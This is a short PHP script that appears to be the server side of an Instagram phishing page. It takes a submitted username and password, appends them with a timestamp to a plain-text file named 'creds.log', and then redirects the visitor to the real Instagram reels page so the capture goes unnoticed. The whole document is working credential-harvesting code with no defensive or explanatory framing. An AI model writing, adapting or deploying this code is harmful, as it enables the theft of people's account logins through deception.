<?php
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $username = $_POST['username'] ?? '';
        $password = $_POST['password'] ?? '';
        
        if (!empty($username) && !empty($password)) {
            $logEntry = date('Y-m-d H:i:s') . " | Username: $username | Password: $password\n";
            file_put_contents('creds.log', $logEntry, FILE_APPEND);
            
            // Redirect to real Instagram after capture
            header("Location: https://www.instagram.com/reels/");
            exit();
        }
    }
?>